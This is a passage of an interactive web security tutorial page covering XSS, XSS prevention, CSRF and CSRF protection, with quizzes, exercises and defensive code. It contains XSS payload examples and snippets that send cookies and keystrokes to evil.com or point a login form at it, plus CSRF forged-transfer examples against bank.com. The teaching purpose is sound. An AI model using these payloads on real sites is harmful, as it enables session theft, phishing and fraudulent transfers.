<span class="keyword">const</span> userInput = <span class="prop">window</span>.<span class="prop">location</span>.<span class="prop">hash</span>.<span class="func">substring</span>(<span class="num">1</span>);
<span class="prop">document</span>.<span class="func">getElementById</span>(<span class="string">'output'</span>).<span class="prop">innerHTML</span> = userInput;
<span class="comment">// üíÄ The img tag's onerror fires JavaScript!</span>
          </div>
        </div>
      </div>

      <!-- Interactive XSS Demo -->
      <div class="card">
        <h3>üî¨ Interactive Demo: See XSS in Action</h3>
        <p>Type different inputs to see how XSS works. <strong>This is sandboxed and safe.</strong></p>

        <div class="demo-container">
          <h4>‚ö° Vulnerable Comment System Simulator</h4>
          <p style="font-size: 0.85rem; color: var(--text-dim); margin-bottom: 10px;">Try these payloads to see what happens:</p>

          <div class="toggle-group">
            <button class="toggle-btn" onclick="setXSSInput('Hello, nice post!')">Normal Input</button>
            <button class="toggle-btn" onclick="setXSSInput('<b>Bold text</b>')">HTML Injection</button>
            <button class="toggle-btn" onclick="setXSSInput('<img src=x onerror=alert(1)>')">Image XSS</button>
            <button class="toggle-btn" onclick="setXSSInput('<script>alert(document.cookie)</script>')">Script Tag</button>
            <button class="toggle-btn" onclick="setXSSInput('<a href=\"javascript:alert(1)\">Click me</a>')">Link XSS</button>
          </div>

          <input type="text" class="demo-input" id="xssInput" placeholder="Type a comment..." value="Hello, nice post!">

          <div style="display: flex; gap: 10px; margin-top: 10px;">
            <button class="demo-btn btn-danger" onclick="renderXSSUnsafe()">‚ö†Ô∏è Render Unsafe (innerHTML)</button>
            <button class="demo-btn btn-success" onclick="renderXSSSafe()">‚úÖ Render Safe (textContent)</button>
          </div>

          <div style="margin-top: 15px;">
            <div style="font-size: 0.85rem; color: var(--text-dim); margin-bottom: 5px;">Output:</div>
            <div class="browser-frame">
              <div class="browser-bar">
                <div class="browser-dots">
                  <div class="browser-dot dot-red"></div>
                  <div class="browser-dot dot-yellow"></div>
                  <div class="browser-dot dot-green"></div>
                </div>
                <div class="browser-url">https://trusted-site.com/comments</div>
              </div>
              <div class="browser-body" id="xssOutput">
                <div style="color: var(--text-dim); font-style: italic;">Output will appear here...</div>
              </div>
            </div>
          </div>

          <div id="xssExplanation" style="margin-top: 10px; font-size: 0.85rem; padding: 10px; border-radius: 8px; display: none;"></div>
        </div>
      </div>

      <!-- What Can XSS Do? -->
      <div class="card">
        <h3>üíÄ What Can an Attacker Do with XSS?</h3>
        <div class="grid-2">
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px;">
            <strong style="color: var(--danger);">üç™ Steal Cookies/Sessions</strong>
            <div class="code-block code-bad" style="font-size: 0.75rem;">
<span class="keyword">new</span> <span class="func">Image</span>().<span class="prop">src</span> =
  <span class="string">"https://evil.com?c="</span>+<span class="prop">document</span>.<span class="prop">cookie</span>;
            </div>
          </div>
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px;">
            <strong style="color: var(--danger);">üìù Modify Page Content</strong>
            <div class="code-block code-bad" style="font-size: 0.75rem;">
<span class="prop">document</span>.<span class="prop">body</span>.<span class="prop">innerHTML</span> =
  <span class="string">'&lt;h1&gt;Hacked!&lt;/h1&gt;'</span>;
            </div>
          </div>
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px;">
            <strong style="color: var(--danger);">üîë Capture Keystrokes</strong>
            <div class="code-block code-bad" style="font-size: 0.75rem;">
<span class="prop">document</span>.<span class="func">addEventListener</span>(<span class="string">'keypress'</span>,
  <span class="keyword">e</span> => <span class="func">fetch</span>(<span class="string">'https://evil.com?k='</span>+e.<span class="prop">key</span>));
            </div>
          </div>
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px;">
            <strong style="color: var(--danger);">üé£ Phishing</strong>
            <div class="code-block code-bad" style="font-size: 0.75rem;">
<span class="comment">// Replace login form with fake</span>
<span class="prop">document</span>.<span class="func">querySelector</span>(<span class="string">'form'</span>)
  .<span class="prop">action</span> = <span class="string">'https://evil.com/phish'</span>;
            </div>
          </div>
        </div>
      </div>

      <!-- XSS Quiz -->
      <div class="card">
        <h3>üß† Quiz: XSS Knowledge Check</h3>

        <div class="quiz-question" data-quiz="xss1">
          <h4>‚ùì Q1: Which type of XSS is stored in the database?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss1')">Reflected XSS</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'xss1')">Stored XSS</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss1')">DOM-based XSS</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss1')">Network XSS</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="xss1">Stored XSS persists in the server's database. Every user viewing that content gets attacked.</div>
        </div>

        <div class="quiz-question" data-quiz="xss2">
          <h4>‚ùì Q2: Which is a DOM-based XSS sink?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss2')">textContent</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'xss2')">innerHTML</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss2')">setAttribute('class', ...)</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss2')">console.log()</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="xss2">innerHTML parses and renders HTML, including script-executing elements like &lt;img onerror&gt;. textContent is safe because it treats everything as plain text.</div>
        </div>

        <div class="quiz-question" data-quiz="xss3">
          <h4>‚ùì Q3: What does this payload do? <code style="color: var(--accent);">&lt;img src=x onerror=alert(1)&gt;</code></h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss3')">Shows a broken image</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss3')">Nothing, it's filtered</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'xss3')">Loads image, fails, then runs JavaScript via onerror</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'xss3')">Redirects to another page</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="xss3">The src="x" fails to load, triggering the onerror event handler which executes the JavaScript. This is a classic XSS vector that doesn't need &lt;script&gt; tags!</div>
        </div>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('intro')">‚Üê Overview</button>
        <button class="demo-btn btn-primary" onclick="showSection('xss-prevention')">XSS Prevention ‚Üí</button>
      </div>
    </div>

    <!-- ==================== XSS PREVENTION ==================== -->
    <div class="section" id="section-xss-prevention">
      <div class="section-header">
        <h2>üîí XSS Prevention</h2>
        <p>Learn the essential techniques to protect your applications from XSS attacks.</p>
      </div>

      <div class="card">
        <h3>üèóÔ∏è Defense Strategy: Defense in Depth</h3>
        <p>Never rely on a single defense. Layer multiple protections:</p>

        <div class="diagram">
          <div style="display: flex; flex-direction: column; gap: 8px; max-width: 500px; margin: 0 auto;">
            <div style="padding: 12px; background: rgba(0,230,118,0.1); border: 1px solid var(--success); border-radius: 8px; text-align: center;">Layer 1: Output Encoding/Escaping</div>
            <div style="padding: 12px; background: rgba(0,240,255,0.1); border: 1px solid var(--accent); border-radius: 8px; text-align: center;">Layer 2: Input Validation</div>
            <div style="padding: 12px; background: rgba(124,58,237,0.15); border: 1px solid var(--accent2); border-radius: 8px; text-align: center;">Layer 3: Content Security Policy (CSP)</div>
            <div style="padding: 12px; background: rgba(255,184,0,0.1); border: 1px solid var(--warning); border-radius: 8px; text-align: center;">Layer 4: HTTPOnly Cookies</div>
          </div>
        </div>
      </div>

      <!-- Technique 1: Output Encoding -->
      <div class="card">
        <h3>1Ô∏è‚É£ Output Encoding (The #1 Defense)</h3>
        <p>Always encode user data before inserting into HTML. Convert dangerous characters to their safe HTML entity equivalents.</p>

        <table class="comparison-table">
          <tr><th>Character</th><th>HTML Entity</th><th>Why Dangerous</th></tr>
          <tr><td>&lt;</td><td>&amp;lt;</td><td>Opens HTML tags</td></tr>
          <tr><td>&gt;</td><td>&amp;gt;</td><td>Closes HTML tags</td></tr>
          <tr><td>&amp;</td><td>&amp;amp;</td><td>Starts HTML entities</td></tr>
          <tr><td>"</td><td>&amp;quot;</td><td>Breaks out of attributes</td></tr>
          <tr><td>'</td><td>&amp;#x27;</td><td>Breaks out of attributes</td></tr>
        </table>

        <div class="attack-type">
          <div class="attack-card vulnerable">
            <h4>‚ùå Vulnerable Code</h4>
            <div class="code-block code-bad" style="font-size: 0.8rem;">
<span class="comment">// NEVER do this!</span>
element.<span class="prop">innerHTML</span> = userInput;

<span class="comment">// Or in template literals</span>
<span class="tag">&lt;div&gt;</span>${userName}<span class="tag">&lt;/div&gt;</span>

<span class="comment">// Or with document.write</span>
<span class="prop">document</span>.<span class="func">write</span>(userInput);
            </div>
          </div>
          <div class="attack-card safe">
            <h4>‚úÖ Safe Code</h4>
            <div class="code-block code-good" style="font-size: 0.8rem;">
<span class="comment">// Use textContent instead</span>
element.<span class="prop">textContent</span> = userInput;

<span class="comment">// Or escape before innerHTML</span>
element.<span class="prop">innerHTML</span> = <span class="func">escapeHTML</span>(input);

<span class="comment">// Use DOM APIs</span>
<span class="keyword">const</span> text = <span class="prop">document</span>.<span class="func">createTextNode</span>(input);
parent.<span class="func">appendChild</span>(text);
            </div>
          </div>
        </div>

        <div class="code-block code-good">
          <span class="label good">Escape Function</span>
<span class="keyword">function</span> <span class="func">escapeHTML</span>(str) {
  <span class="keyword">const</span> map = {
    <span class="string">'&amp;'</span>: <span class="string">'&amp;amp;'</span>,
    <span class="string">'&lt;'</span>: <span class="string">'&amp;lt;'</span>,
    <span class="string">'&gt;'</span>: <span class="string">'&amp;gt;'</span>,
    <span class="string">'"'</span>: <span class="string">'&amp;quot;'</span>,
    <span class="string">"'"</span>: <span class="string">'&amp;#x27;'</span>,
    <span class="string">'/'</span>: <span class="string">'&amp;#x2F;'</span>
  };
  <span class="keyword">return</span> str.<span class="func">replace</span>(<span class="string">/[&amp;&lt;&gt;"'\/]/g</span>, c => map[c]);
}
        </div>
      </div>

      <!-- Technique 2: Safe DOM APIs -->
      <div class="card">
        <h3>2Ô∏è‚É£ Use Safe DOM APIs</h3>

        <table class="comparison-table">
          <tr><th>‚ö†Ô∏è Dangerous (Sinks)</th><th>‚úÖ Safe Alternatives</th></tr>
          <tr><td style="color:var(--danger);">element.innerHTML</td><td style="color:var(--success);">element.textContent</td></tr>
          <tr><td style="color:var(--danger);">document.write()</td><td style="color:var(--success);">DOM manipulation methods</td></tr>
          <tr><td style="color:var(--danger);">element.outerHTML</td><td style="color:var(--success);">element.setAttribute()</td></tr>
          <tr><td style="color:var(--danger);">element.insertAdjacentHTML()</td><td style="color:var(--success);">document.createTextNode()</td></tr>
          <tr><td style="color:var(--danger);">eval()</td><td style="color:var(--success);">JSON.parse()</td></tr>
          <tr><td style="color:var(--danger);">setTimeout(string)</td><td style="color:var(--success);">setTimeout(function)</td></tr>
        </table>
      </div>

      <!-- Technique 3: Template Literals Safety -->
      <div class="card">
        <h3>3Ô∏è‚É£ Safe URL Handling</h3>

        <div class="code-block code-bad">
          <span class="label bad">Dangerous</span>
<span class="comment">// User controls href ‚Äî javascript: protocol attack!</span>
<span class="keyword">const</span> link = <span class="prop">document</span>.<span class="func">createElement</span>(<span class="string">'a'</span>);
link.<span class="prop">href</span> = userInput; <span class="comment">// ‚ùå could be "javascript:alert(1)"</span>
        </div>

        <div class="code-block code-good">
          <span class="label good">Safe</span>
<span class="keyword">function</span> <span class="func">sanitizeURL</span>(url) {
  <span class="keyword">try</span> {
    <span class="keyword">const</span> parsed = <span class="keyword">new</span> <span class="func">URL</span>(url);
    <span class="comment">// Only allow http and https protocols</span>
    <span class="keyword">if</span> ([<span class="string">'http:'</span>, <span class="string">'https:'</span>].<span class="func">includes</span>(parsed.<span class="prop">protocol</span>)) {
      <span class="keyword">return</span> parsed.<span class="prop">href</span>;
    }
  } <span class="keyword">catch</span> (e) {}
  <span class="keyword">return</span> <span class="string">'#'</span>; <span class="comment">// fallback safe URL</span>
}

link.<span class="prop">href</span> = <span class="func">sanitizeURL</span>(userInput); <span class="comment">// ‚úÖ Safe!</span>
        </div>
      </div>

      <!-- Interactive Exercise -->
      <div class="exercise-container">
        <h4>üí™ Exercise: Fix the Vulnerable Code</h4>
        <p>The code below has an XSS vulnerability. Fix it by replacing the dangerous method with a safe alternative.</p>

        <div class="code-block" style="margin-bottom: 10px;">
<span class="comment">// VULNERABLE: Fix this function</span>
<span class="keyword">function</span> <span class="func">displayUserName</span>(name) {
  <span class="prop">document</span>.<span class="func">getElementById</span>(<span class="string">'greeting'</span>).<span class="danger-text">innerHTML</span> = <span class="string">'Welcome, '</span> + name;
}
        </div>

        <textarea class="code-editor" id="xssExercise1">function displayUserName(name) {
  // Fix this line to prevent XSS:
  document.getElementById('greeting').innerHTML = 'Welcome, ' + name;
}</textarea>

        <button class="demo-btn btn-primary" onclick="checkXSSExercise1()">Check Solution ‚úì</button>
        <div class="exercise-result" id="xssExResult1"></div>
      </div>

      <!-- Pitfalls -->
      <div class="pitfall-box">
        <h4>‚ö†Ô∏è Common Pitfalls & Mistakes</h4>
        <ul>
          <li><strong>Only escaping &lt; and &gt;:</strong> Attackers can use event handlers like <code>onerror</code>, <code>onfocus</code> etc.</li>
          <li><strong>Blacklist approach:</strong> Trying to block known bad patterns fails. New bypasses are found constantly. Use whitelist!</li>
          <li><strong>Trusting "hidden" inputs:</strong> Hidden form fields, URL params, and headers can ALL be XSS vectors.</li>
          <li><strong>Forgetting about JavaScript context:</strong> Data inside &lt;script&gt; tags needs JS escaping, not HTML escaping.</li>
          <li><strong>Using innerHTML for simple text:</strong> If you don't need HTML, ALWAYS use textContent.</li>
        </ul>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('xss')">‚Üê XSS Attacks</button>
        <button class="demo-btn btn-primary" onclick="showSection('csrf')">CSRF Attacks ‚Üí</button>
      </div>
    </div>

    <!-- ==================== CSRF ==================== -->
    <div class="section" id="section-csrf">
      <div class="section-header">
        <h2>üé≠ Cross-Site Request Forgery (CSRF)</h2>
        <p>Learn how attackers trick users' browsers into making unwanted requests.</p>
      </div>

      <div class="card">
        <h3>ü§î What is CSRF?</h3>
        <p>CSRF tricks a user's browser into performing actions on a site where they're already authenticated. The attacker doesn't see the response ‚Äî they just trigger the action.</p>

        <div class="warning-box">
          <h4>üîë Key Difference from XSS</h4>
          <p><strong>XSS:</strong> Exploits user's trust in a website (runs code ON the site)<br>
          <strong>CSRF:</strong> Exploits website's trust in the user's browser (makes requests FROM external sites)</p>
        </div>

        <div class="diagram">
          <div class="flow-diagram">
            <div class="flow-box flow-victim">üë§ User<br><small>Logged into bank.com</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-attacker">üòà Evil Site<br><small>evil.com/page</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-browser" style="border-color: var(--danger); color: var(--danger);">üåê Hidden Request<br><small>POST bank.com/transfer</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-server">üè¶ Bank Server<br><small>Processes request!</small></div>
          </div>
        </div>
      </div>

      <!-- CSRF Attack Examples -->
      <div class="card">
        <h3>üìã How CSRF Attacks Work</h3>

        <div class="accordion">
          <div class="accordion-header" onclick="toggleAccordion(this)">
            <span>üñºÔ∏è Attack via Image Tag (GET request)</span>
            <span class="arrow">‚ñº</span>
          </div>
          <div class="accordion-body">
            <div class="accordion-body-inner">
              <p>The simplest CSRF ‚Äî no JavaScript needed!</p>
              <div class="code-block code-bad">
                <span class="label bad">evil-site.html</span>
<span class="comment">&lt;!-- User visits evil.com and this silently loads --&gt;</span>
<span class="tag">&lt;img</span> <span class="attr">src</span>=<span class="value">"https://bank.com/transfer?to=attacker&amp;amount=10000"</span>
     <span class="attr">width</span>=<span class="value">"0"</span> <span class="attr">height</span>=<span class="value">"0"</span> <span class="tag">/&gt;</span>

<span class="comment">&lt;!-- Browser sends GET request WITH the user's bank cookies! --&gt;</span>
<span class="comment">&lt;!-- If bank uses GET for transfers... money is gone. --&gt;</span>
              </div>
              <div class="pitfall-box">
                <h4>‚ö†Ô∏è Lesson</h4>
                <p>NEVER use GET requests for state-changing operations (transfers, deletions, etc.)</p>
              </div>
            </div>
          </div>
        </div>

        <div class="accordion">
          <div class="accordion-header" onclick="toggleAccordion(this)">
            <span>üìù Attack via Hidden Form (POST request)</span>
            <span class="arrow">‚ñº</span>
          </div>
          <div class="accordion-body">
            <div class="accordion-body-inner">
              <p>More sophisticated ‚Äî submits a POST request automatically:</p>
              <div class="code-block code-bad">
                <span class="label bad">evil-site.html</span>
<span class="tag">&lt;body</span> <span class="attr">onload</span>=<span class="value">"document.forms[0].submit()"</span><span class="tag">&gt;</span>
  <span class="tag">&lt;form</span> <span class="attr">action</span>=<span class="value">"https://bank.com/transfer"</span> <span class="attr">method</span>=<span class="value">"POST"</span><span class="tag">&gt;</span>
    <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="value">"hidden"</span> <span class="attr">name</span>=<span class="value">"to"</span> <span class="attr">value</span>=<span class="value">"attacker-account"</span><span class="tag">/&gt;</span>
    <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="value">"hidden"</span> <span class="attr">name</span>=<span class="value">"amount"</span> <span class="attr">value</span>=<span class="value">"10000"</span><span class="tag">/&gt;</span>
  <span class="tag">&lt;/form&gt;</span>
<span class="tag">&lt;/body&gt;</span>

<span class="comment">&lt;!-- Page loads ‚Üí form auto-submits ‚Üí money transferred --&gt;</span>
<span class="comment">&lt;!-- User's cookies are sent automatically by browser --&gt;</span>
              </div>
            </div>
          </div>
        </div>

        <div class="accordion">
          <div class="accordion-header" onclick="toggleAccordion(this)">
            <span>‚ö° Attack via Fetch/AJAX</span>
            <span class="arrow">‚ñº</span>
          </div>
          <div class="accordion-body">
            <div class="accordion-body-inner">
              <p>Using JavaScript to send forged requests:</p>
              <div class="code-block code-bad">
                <span class="label bad">evil-site.js</span>
<span class="comment">// On evil.com:</span>
<span class="func">fetch</span>(<span class="string">'https://bank.com/api/transfer'</span>, {
  <span class="prop">method</span>: <span class="string">'POST'</span>,
  <span class="prop">credentials</span>: <span class="string">'include'</span>, <span class="comment">// Sends victim's cookies!</span>
  <span class="prop">headers</span>: { <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span> },
  <span class="prop">body</span>: <span class="func">JSON.stringify</span>({
    <span class="prop">to</span>: <span class="string">'attacker'</span>,
    <span class="prop">amount</span>: <span class="num">10000</span>
  })
});
<span class="comment">// Note: CORS would block reading the response,</span>
<span class="comment">// but the request is STILL SENT (for simple requests)!</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Visual Attack Simulation -->
      <div class="card">
        <h3>üé¨ Interactive: CSRF Attack Simulation</h3>
        <div class="demo-container">
          <h4>‚ö° Watch a CSRF Attack Unfold</h4>
          <button class="demo-btn btn-danger" onclick="simulateCSRF()">‚ñ∂ Run Attack Simulation</button>
          <button class="demo-btn btn-outline" onclick="resetCSRFSim()">‚Ü∫ Reset</button>

          <div class="attack-sim" id="csrfSim">
            <div class="sim-entity" style="top:20px; left:20px; padding: 15px 20px; background: rgba(0,240,255,0.1); border: 1px solid var(--accent); border-radius: 10px; font-size: 0.8rem;">
              üë§ You<br><small>Logged into bank.com</small>
            </div>
            <div class="sim-entity" style="top:20px; right:20px; padding: 15px 20px; background: rgba(255,62,108,0.1); border: 1px solid var(--danger); border-radius: 10px; font-size: 0.8rem;">
              üòà evil.com<br><small id="csrfStep1">Waiting...</small>
            </div>
            <div class="sim-entity" style="bottom:20px; left:50%; transform:translateX(-50%); padding: 15px 20px; background: rgba(124,58,237,0.15); border: 1px solid var(--accent2); border-radius: 10px; font-size: 0.8rem;">
              üè¶ bank.com<br><small id="csrfStep3">Server idle</small>
            </div>
            <div id="csrfPacket1" class="sim-packet" style="top:40px; left:180px; background: rgba(255,62,108,0.3); border: 1px solid var(--danger);">üìß</div>
            <div id="csrfPacket2" class="sim-packet" style="top:100px; left:50%; background: rgba(255,184,0,0.3); border: 1px solid var(--warning);">üç™</div>
            <div id="csrfLog" style="position: absolute; bottom: 80px; left: 20px; right: 20px; font-size: 0.75rem; color: var(--text-dim);"></div>
          </div>
        </div>
      </div>

      <!-- CSRF Quiz -->
      <div class="card">
        <h3>üß† Quiz: CSRF Knowledge Check</h3>

        <div class="quiz-question" data-quiz="csrf1">
          <h4>‚ùì Q1: What does CSRF exploit?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csrf1')">Vulnerabilities in JavaScript code</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'csrf1')">The server's trust in authenticated user sessions</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csrf1')">Weak encryption algorithms</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csrf1')">SQL injection in the database</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="csrf1">CSRF exploits the fact that browsers automatically send cookies with requests. The server sees valid cookies and trusts the request.</div>
        </div>

        <div class="quiz-question" data-quiz="csrf2">
          <h4>‚ùì Q2: Can an attacker read the response of a CSRF request?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csrf2')">Yes, always</div>
            <div class="quiz-option" onclick="checkQuiz(this, true, 'csrf2')">No, CORS prevents reading cross-origin responses</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csrf2')">Only with JavaScript enabled</div>
            <div class="quiz-option" onclick="checkQuiz(this, false, 'csrf2')">Only with HTTPS</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="csrf2">CORS blocks reading responses, but the request is still sent! That's why CSRF is dangerous ‚Äî the attacker doesn't need the response, just the side effect (like money being transferred).</div>
        </div>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('xss-prevention')">‚Üê XSS Prevention</button>
        <button class="demo-btn btn-primary" onclick="showSection('csrf-protection')">CSRF Protection ‚Üí</button>
      </div>
    </div>

    <!-- ==================== CSRF PROTECTION ==================== -->
    <div class="section" id="section-csrf-protection">
      <div class="section-header">
        <h2>üõ°Ô∏è CSRF Protection</h2>
        <p>Learn how to defend your applications against CSRF attacks.</p>
      </div>

      <!-- Token Pattern -->
      <div class="card">
        <h3>1Ô∏è‚É£ CSRF Tokens (Synchronizer Token Pattern)</h3>
        <p>The server generates a unique, unpredictable token for each session/form. The form must include this token, which an attacker can't know.</p>

        <div class="diagram">
          <div class="flow-diagram">
            <div class="flow-box flow-server">üñ•Ô∏è Server<br><small>Generates token</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-browser">üìù Form<br><small>Includes hidden token</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-server">üñ•Ô∏è Server<br><small>Validates token</small></div>
          </div>
        </div>

        <div class="code-block code-good">
          <span class="label good">Server-side</span>
<span class="comment">// Express.js with csurf middleware</span>
<span class="keyword">const</span> csrf = <span class="func">require</span>(<span class="string">'csurf'</span>);
<span class="keyword">const</span> csrfProtection = <span class="func">csrf</span>({ <span class="prop">cookie</span>: <span class="keyword">true</span> });

app.<span class="func">get</span>(<span class="string">'/form'</span>, csrfProtection, (req, res) => {
  res.<span class="func">render</span>(<span class="string">'form'</span>, { <span class="prop">csrfToken</span>: req.<span class="func">csrfToken</span>() });
});

app.<span class="func">post</span>(<span class="string">'/transfer'</span>, csrfProtection, (req, res) => {
  <span class="comment">// Token automatically validated by middleware</span>
  <span class="comment">// If invalid ‚Üí 403 Forbidden</span>
  processTransfer(req.<span class="prop">body</span>);
});
        </div>

        <div class="code-block code-good">
          <span class="label good">Client-side</span>
<span class="comment">&lt;!-- In your HTML form --&gt;</span>
<span class="tag">&lt;form</span> <span class="attr">action</span>=<span class="value">"/transfer"</span> <span class="attr">method</span>=<span class="value">"POST"</span><span class="tag">&gt;</span>
  <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="value">"hidden"</span> <span class="attr">name</span>=<span class="value">"_csrf"</span> <span class="attr">value</span>=<span class="value">"<%= csrfToken %>"</span><span class="tag">/&gt;</span>
  <span class="tag">&lt;input</span> <span class="attr">name</span>=<span class="value">"to"</span> <span class="attr">placeholder</span>=<span class="value">"Recipient"</span><span class="tag">/&gt;</span>
  <span class="tag">&lt;input</span> <span class="attr">name</span>=<span class="value">"amount"</span> <span class="attr">type</span>=<span class="value">"number"</span><span class="tag">/&gt;</span>
  <span class="tag">&lt;button</span> <span class="attr">type</span>=<span class="value">"submit"</span><span class="tag">&gt;</span>Transfer<span class="tag">&lt;/button&gt;</span>
<span class="tag">&lt;/form&gt;</span>

<span class="comment">&lt;!-- For AJAX requests --&gt;</span>
<span class="tag">&lt;script&gt;</span>
<span class="func">fetch</span>(<span class="string">'/api/transfer'</span>, {
  <span class="prop">method</span>: <span class="string">'POST'</span>,
  <span class="prop">headers</span>: {
    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,
    <span class="string">'X-CSRF-Token'</span>: csrfToken  <span class="comment">// Send in header</span>
  },
  <span class="prop">body</span>: <span class="func">JSON.stringify</span>({ <span class="prop">to</span>: <span class="string">'friend'</span>, <span class="prop">amount</span>: <span class="num">50</span> })
});
<span class="tag">&lt;/script&gt;</span>
        </div>
      </div>

      <!-- SameSite Cookies -->
      <div class="card">
        <h3>2Ô∏è‚É£ SameSite Cookie Attribute</h3>
        <p>Tell browsers to NOT send cookies with cross-site requests.</p>

        <table class="comparison-table">
          <tr><th>Value</th><th>Behavior</th><th>CSRF Protection</th></tr>
          <tr>
            <td><code style="color:var(--success);">Strict</code></td>
            <td>Cookie never sent cross-site</td>
            <td><span class="badge badge-success">Strong</span></td>
          </tr>
          <tr>
            <td><code style="color:var(--warning);">Lax</code></td>
            <td>Sent on top-level GET navigation only</td>
            <td><span class="badge badge-warning">Good</span></td>
          </tr>
          <tr>
            <td><code style="color:var(--danger);">None</code></td>
            <td>Always sent (requires Secure flag)</td>
            <td><span class="badge badge-danger">None</span></td>
          </tr>
        </table>

        <div class="code-block code-good">
          <span class="label good">Recommended</span>
<span class="comment">// Express.js cookie settings</span>
res.<span class="func">cookie</span>(<span class="string">'sessionId'</span>, token, {
  <span class="prop">httpOnly</span>: <span class="keyword">true</span>,     <span class="comment">// Can't access via JavaScript</span>
  <span class="prop">secure</span>: <span class="keyword">true</span>,       <span class="comment">// HTTPS only</span>
  <span class="prop">sameSite</span>: <span class="string">'Strict'</span>, <span class="comment">// No cross-site sending</span>
  <span class="prop">maxAge</span>: <span class="num">3600000</span>     <span class="comment">// 1 hour</span>
});
        </div>
      </div>

      <!-- Other Defenses -->
      <div class="card">
        <h3>3Ô∏è‚É£ Additional Defenses</h3>

        <div class="grid-2">
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px;">
            <h4 style="color: var(--success);">‚úÖ Check Origin/Referer Headers</h4>
            <div class="code-block code-good" style="font-size: 0.78rem;">
<span class="keyword">function</span> <span class="func">validateOrigin</span>(req) {
  <span class="keyword">const</span> origin = req.<span class="prop">headers</span>.<span class="prop">origin</span>
    || req.<span class="prop">headers</span>.<span class="prop">referer</span>;
  <span class="keyword">const</span> allowed = <span class="string">'https://mysite.com'</span>;
  <span class="keyword">return</span> origin?.startsWith(allowed);
}
            </div>
          </div>
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px;">
            <h4 style="color: var(--success);">‚úÖ Custom Request Headers</h4>
            <div class="code-block code-good" style="font-size: 0.78rem;">
<span class="comment">// Custom headers can't be set cross-site</span>
<span class="func">fetch</span>(<span class="string">'/api/data'</span>, {
  <span class="prop">headers</span>: {
    <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>
  }
});
<span class="comment">// Server checks for this header</span>
            </div>
          </div>
        </div>
      </div>

      <div class="exercise-container">
        <h4>üí™ Exercise: Implement CSRF Protection</h4>
        <p>Complete the middleware function that validates CSRF tokens:</p>

        <textarea class="code-editor" id="csrfExercise1">function csrfMiddleware(req, res, next) {
  if (req.method === 'GET') {
    // GET requests are safe, generate token
    req.csrfToken = generateToken();
    return next();
  }

  // TODO: For POST/PUT/DELETE, validate the token
  // Hint: Compare req.body._csrf OR req.headers['x-csrf-token']
  // with the token stored in req.session.csrfToken

}</textarea>

        <button class="demo-btn btn-primary" onclick="checkCSRFExercise()">Check Solution ‚úì</button>
        <div class="exercise-result" id="csrfExResult1"></div>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('csrf')">‚Üê CSRF Attacks</button>
        <button class="demo-btn btn-primary" onclick="showSection('csp')">Content Security Policy ‚Üí</button>
      </div>
    </div>

    <!-- ==================== CSP ==================== -->
    <div class="section" id="section-csp">
      <div class="section-header">
        <h2>üìã Content Security Policy (CSP)</h2>
        <p>Your last line of defense against XSS ‚Äî even if injection happens, CSP blocks execution.</p>
      </div>

      <div class="card">
        <h3>ü§î What is CSP?</h3>
        <p>CSP is an HTTP header that tells browsers <strong>which sources are allowed</strong> to load content. If an attacker injects a script, CSP blocks it because it doesn't come from an approved source.</p>

        <div class="diagram">
          <div style="max-width: 500px; margin: 0 auto; text-align: left;">
            <div style="padding: 12px 20px; background: rgba(0,230,118,0.1); border: 1px solid var(--success); border-radius: 8px; margin: 8px 0;">
              ‚úÖ <code>script-src 'self'</code> ‚Üí Own domain scripts: ALLOWED
            </div>
            <div style="padding: 12px 20px; background: rgba(0,230,118,0.1); border: 1px solid var(--success); border-radius: 8px; margin: 8px 0;">
              ‚úÖ <code>script-src cdn.example.com</code> ‚Üí CDN scripts: ALLOWED
            </div>
            <div style="padding: 12px 20px; background: rgba(255,62,108,0.1); border: 1px solid var(--danger); border-radius: 8px; margin: 8px 0;">
